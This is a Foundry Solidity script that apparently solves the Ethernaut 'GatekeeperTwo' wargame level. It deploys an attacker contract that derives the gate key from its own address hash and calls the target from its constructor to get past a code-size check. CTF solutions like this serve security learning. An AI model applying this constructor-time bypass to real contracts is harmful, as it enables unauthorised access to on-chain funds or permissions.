//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {GatekeeperTwo}  from "src/ethernaut14.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut14Script is Script{
    GatekeeperTwo instance = GatekeeperTwo(0x9f0abaC37EAd89f231Be0Ea484cF4409eE8aA3E8);
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attacker attacke = new attacker{value: 0.001 ether}(instance);
        vm.stopBroadcast();
    }
}

contract attacker{
    constructor(GatekeeperTwo instance) payable{
        uint64 gateKey = ~uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        instance.enter(bytes8(gateKey));
    }
    function attack() public{
        selfdestruct(payable(address(0)));
    }
}

